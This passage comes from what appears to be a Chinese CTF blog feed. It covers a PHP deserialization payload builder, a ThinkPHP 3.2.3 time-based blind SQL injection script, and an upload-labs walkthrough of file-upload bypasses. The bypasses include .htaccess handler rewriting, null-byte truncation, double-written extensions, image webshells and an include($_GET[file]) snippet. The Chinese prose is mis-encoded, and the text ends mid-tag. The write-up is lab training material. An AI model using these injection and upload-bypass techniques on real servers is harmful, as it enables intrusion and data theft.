class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/06/kYRMtg.png" alt="kYRMtg.png"></p><h4 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h4><p>æ„Ÿè§‰é¢˜ç›®ç©åäº†ã€‚ã€‚ã€‚ã€‚</p><p>åæ­£çœ‹äº†çœ‹ä¸€å¶é£˜é›¶å¤§ä½¬çš„é¢˜è§£ï¼Œè€ƒçš„æ˜¯ä¸€ä¸ªSQLçº¦æŸæ”»å‡»ï¼Œä»¥åŠä¸€ä¸ªtp3.2çš„ä¸€ä¸ªæ³¨å…¥ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªæŠ¥é”™æ³¨å…¥ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ç›®ã€‚è‡ªå·±æŠŠæºç ä¸‹ä¸‹æ¥è‡ªå·±å¤ç°ä¸€ä¸‹23333ï¼Œä»–è¿™ä¸ªä»£ç é‡Œé¢å…³é”®æ˜¯æœ‰ä¸€ä¸ªoptionså˜é‡æ˜¯å¯æ§çš„ï¼Œè¿™ä¿®å¤çš„æ–¹æ¡ˆä¹Ÿæ˜¯ä¸å†å¼•ç”¨å¤–éƒ¨çš„å¯æ§å˜é‡</p><p>æºç ä¸‹è½½:<a href="http://www.thinkphp.cn/download/610.html" target="_blank" rel="noopener">http://www.thinkphp.cn/download/610.html</a></p><p>ä¸‹é¢æ˜¯è‡ªå·±æ­å»ºè¯¥ç¯å¢ƒ(phpstudy)çš„æµ‹è¯•è¿‡ç¨‹</p><p><img src="https://s2.ax1x.com/2019/02/06/kYT2ff.png" alt="kYT2ff.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI7uj.png" alt="kYI7uj.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI58S.png" alt="kYI58S.png"></p><p>å†å°è¯•ä¸€ä¸‹é£˜é›¶å¤§å“¥çš„æ–¹æ³•,åˆ©ç”¨äº†ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼Œtql(ç ´éŸ³)~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">url = <span class="string">'http://127.0.0.1/thinkphp3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and if((ascii(substr((select pass from user limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿèƒ½è·‘å‡ºç»“æœ</p><p><img src="https://s2.ax1x.com/2019/02/06/kYTbt0.png" alt="kYTbt0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™ä¸ªæœˆçš„å®‰æ’æœˆèµ›å¥½åƒå¾ˆæœ‰æ„æ€
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labsè®°å½•</title>
    <link href="0verwatch.top/upload-labs-wp.html"/>
    <id>0verwatch.top/upload-labs-wp.html</id>
    <published>2019-02-03T08:55:03.000Z</published>
    <updated>2019-02-13T13:53:17.703Z</updated>
    
    <content type="html"><![CDATA[<p>é—²æ¥æ— èŠï¼ŒæŠŠupload-labsæ‰€æœ‰çš„å…³å¡éƒ½åˆ·ä¸€é<a id="more"></a>ï¼Œå°±å½“å¤ä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å„ç§ç»•è¿‡æŠ€å·§å§ï¼Œåšå®Œä¸€å…³å†çœ‹çœ‹æºä»£ç æé«˜ä¸€ä¸‹å®¡è®¡èƒ½åŠ›æŒºå¥½çš„</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>ä¸€ä¸ªå‰ç«¯æ£€æµ‹ï¼Œå¯ä»¥ç¦ç”¨jsï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…å°±å¯ä»¥ç»•è¿‡ä¸Šä¼ </p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9HYQ.png" alt="kJ9HYQ.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9zwT.png" alt="kJ9zwT.png"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>Content-Typeç»•è¿‡ï¼Œç›´æ¥æŠŠContent-Typeæ”¹ä¸ºå›¾ç‰‡ç±»å‹å³å¯</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCA61.png" alt="kJCA61.png"></p><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCmTO.png" alt="kJCmTO.png"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>è¿™ä¸€å…³æ˜¯å¦ç±»çš„æ–‡ä»¶åçš„ç»•è¿‡ï¼Œå¯ä»¥å°è¯•phtmlï¼Œphp3ï¼Œphp4, php5, phtåç¼€åéƒ½å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯å‰ææ˜¯è¦åœ¨é…ç½®æ–‡ä»¶é‡Œé¢æœ‰è¿™æ ·çš„ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJCIj1.png" alt="kJCIj1.png"></p><p>æˆåŠŸå›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/02/04/kJC7B6.png" alt="kJC7B6.png"></p><p>æºç é‡Œé¢ç›´æ¥ç”¨çš„é»‘åå•ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•</p><p>å°±æ˜¯ä¸Šä¼ <code>.htaccess</code>ï¼Œå®ç°é‡å†™æ–‡ä»¶è§£æ,åŒæ ·è¿™æ ·çš„å‰æä¹Ÿæ˜¯å¾—åœ¨é…ç½®æ–‡ä»¶é‡Œé¢æœ‰è¿™æ ·çš„ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>ä¸Šé¢çš„æ–¹æ³•å·²ç»ä¸è¡Œäº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä»–è¿‡æ»¤çš„åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br></pre></td></tr></table></figure><p>æ¯”åˆšæ‰çš„é»‘åå•å¤šäº†ä¸å°‘ï¼Œä½†æ˜¯<code>.htaccess</code>è¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯åœ¨uploadç›®å½•ä¸‹åŒ¹é…gg.jpgçš„æ–‡ä»¶å¹¶ä»¥phpæ–‡ä»¶æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gg.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJPput.png" alt="kJPput.png"></p><p>ç„¶åå†ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºgg.jpgçš„è„šæœ¬</p><p><img src="https://s2.ax1x.com/2019/02/04/kJVbM4.png" alt="kJVbM4.png"></p><p>ç„¶åè®¿é—®æˆåŠŸæ‰§è¡Œ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJZgfK.png" alt="kJZgfK.png"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>è¿™ä¸€é¢˜é‡Œé¢å¤šè¿‡æ»¤äº†<code>.htaccess</code>ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmaqJ.png" alt="kJmaqJ.png"></p><p>å¯¹æ¯”ä¸€ä¸‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œå› ä¸ºè¿™é‡ŒæŠŠåŸæ¥è½¬æ¢æˆå°å†™çš„é‚£ä¸€éƒ¨åˆ†ç»™åˆ æ‰äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmBI1.png" alt="kJmBI1.png"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>è¿™ä¸€å…³æ¯”ç¬¬äº”å…³å°‘äº†è¿™æ ·çš„ä¸€å¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥åç¼€å+ç©ºæ ¼çš„å½¢å¼å»ç»•è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/04/kJnO1K.png" alt="kJnO1K.png"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>å¯¹æ¯”ç¬¬6é¢˜çš„ä»£ç å¯ä»¥å‘ç°å°‘äº†ä¸‹é¢ä¸€å¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ²¡æœ‰å¯¹æ–‡ä»¶æœ€åçš„ç‚¹åšè¿‡æ»¤ï¼Œå¯ä»¥å°è¯•ä»¥åç¼€ååŠ ä¸Šç‚¹çš„å½¢å¼å»ç»•è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/04/kJKZ26.png" alt="kJKZ26.png"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>è¿™ä¸€é¢˜çš„ä»£ç æ¯”ä¸Šä¸€æ¬¡å°‘äº†ä¸‹é¢è¿™ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯å…³äºwindowsä¸‹æ–‡ä»¶çš„æµç‰¹æ€§ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥å°±æ˜¯è¯´è¿™ä¸œè¥¿åº”è¯¥åªèƒ½åœ¨Windowsä¸‹è¿è¡Œäº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1FOK.png" alt="kJ1FOK.png"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>è¿™ä¸€å…³åƒæ˜¯å‰å‡ å…³çš„ç»„åˆæ‹³ï¼Œè™½ç„¶æŠŠæœ€åçš„ç‚¹ç»™åˆ æ‰ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºè¿™é‡Œçš„è¿‡æ»¤å¹¶æ²¡æœ‰é€’å½’ä¸‹å»ï¼Œåªæ˜¯ä¸€æ­¥ï¼Œè¿™æ ·å°±ç›¸å½“äºSQLæ³¨å…¥é‡Œé¢ç”¨str_replaceåªè¿‡æ»¤ä¸€æ¬¡å…³é”®å­—ä¸€æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥éµå¾ªç€ä»–çš„æ­¥éª¤å»å®ç°è‡ªå·±çš„payloadï¼Œå¯ä»¥è¿™æ ·è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.php. .</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥æ£€æµ‹åˆ°æœ€åçš„æ–‡ä»¶åæ˜¯<code>4.php.</code>è¿™æ ·å°±ç›¸å½“äºç¬¬ä¸ƒå…³äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1zB8.png" alt="kJ1zB8.png"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>å…³é”®è¿‡æ»¤çš„ä»£ç å°±è¿™ä¸¤å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>è·Ÿæˆ‘ä¸Šä¸€å…³è®²çš„SQLæ³¨å…¥çš„ç±»å‹å·®ä¸å¤šï¼Œå°±æ˜¯åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ3yKP.png" alt="kJ3yKP.png"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>å…³é”®çš„ä»£ç åœ¨äºè¿™é‡Œçš„â€™save_pathâ€™æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œä½†æ˜¯åé¢è¿˜æ‹¼æ¥ä¸Šä¸€ä¸ªåç¼€åï¼Œä¹Ÿéœ€è¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨%00æˆªæ–­ï¼Œä½†è¿™ä¸œè¥¿æœ‰ç‚¹è¿‡æ°”äº†ï¼Œå› ä¸ºéœ€è¦ä¸¤ä¸ªæ¡ä»¶</p><ol><li>phpç‰ˆæœ¬å°äº5.3.4</li><li>phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</li></ol><p>å¦‚æœè¦å®Œæˆè¿™ä¸€ä¸ªé¢˜ç›®å°±å¿…é¡»è¦å®ç°ä¸Šé¢çš„ä¸¤ä¸ªæ¡ä»¶ï¼Œä½†æ˜¯ç°åœ¨éƒ½PHP7äº†ï¼Œè¿™ä¸œè¥¿ä¹Ÿå°±å¾ˆå°‘è§äº†ï¼Œæ»¡è¶³ä¸Šé¢çš„æ¡ä»¶çš„æ—¶å€™phpå°±æ˜¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™ä¹Ÿå¯¼è‡´äº†å¾ˆå¤šçš„é—®é¢˜ï¼Œæ–‡ä»¶åŒ…å«ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹</p><p>æ‰€ä»¥å¦‚æœè¦ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å»å®ç°ï¼Œå¦save_pathç­‰äºä¸‹é¢çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/4.php%00</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcCUH.png" alt="kJcCUH.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>è¿™é‡Œçš„æºä»£ç å°±æ”¹äº†ä¸€ç‚¹ç‚¹ï¼Œå°±æ˜¯æŠŠgetæ”¹ä¸ºpostç±»å‹ï¼Œä¸€æ ·çš„æ–¹å¼ç»•è¿‡ï¼Œåªä¸è¿‡è¿™é‡Œéœ€è¦åœ¨äºŒè¿›åˆ¶é‡Œé¢ä¿®æ”¹%00ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcP5d.png" alt="kJcP5d.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>ä»è¿™ä¸€å…³å¼€å§‹è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥æ‰§è¡Œå›¾ç‰‡é©¬ï¼Œéœ€è¦å¦å¤–çš„æ–¹æ³•å»å®ç°ä¸€èˆ¬æ˜¯åŠ ä¸Šphpä¼ªåè®®å»getshellï¼Œå¸¸è§çš„æœ‰pharï¼Œzipç­‰ç­‰<br>å¦‚æœæƒ³è¦çœ‹åˆ°è¯¦ç»†çš„æ•ˆæœå¯ä»¥å†™ä¸€ä¸‹ç®€å•çš„è„šæœ¬æ”¾åœ¨uploadç›®å½•ä¸‹å³å¯ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span> $_GET[file];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€æœ€æœ€ç®€å•çš„å›¾ç‰‡é©¬ç›´æ¥ä¸€æ¡å‘½ä»¤å³å¯ç”Ÿæˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg /b + shell.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰è„šæœ¬è¯­è¨€</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcYrT.png" alt="kJcYrT.png"></p><p>æŠŠè¯¥å›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œå°è¯•æ–‡ä»¶åŒ…å«ï¼ŒæˆåŠŸå›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcaa4.png" alt="kJcaa4.png"></p><p>è¿™é‡Œå¯ä»¥å‘ç°æºä»£ç åªæ˜¯ç”¨äº†unpackè¿™ä¸€ä¸ªå‡½æ•°å»å®ç°å¯¹äºphpå‰ä¸¤ä¸ªå­—èŠ‚çš„æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯åªæ˜¯å¯¹æ–‡ä»¶å¤´åšæ£€æµ‹ã€‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br></pre></td></tr></table></figure><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>ç±»ä¼¼ä¸Šä¸€ä¸ªé¢˜ç›®,è·å–äº†å›¾ç‰‡çš„ç›¸å…³çš„å¤§å°åŠç±»å‹ï¼Œå¹¶éªŒè¯æ˜¯å¦æ—¶åˆ»ä¸Šä¼ çš„å›¾ç‰‡ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨æ–‡ä»¶å¤´çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJchid.png" alt="kJchid.png"></p><p>è¯´æ˜info[2]æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„ç±»å‹ï¼ŒåŒæ ·çš„æ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡çš„</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcrxx.png" alt="kJcrxx.png"></p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>æ¢äº†ä¸€ä¸ªè·å–å›¾ç‰‡ä¿¡æ¯çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td 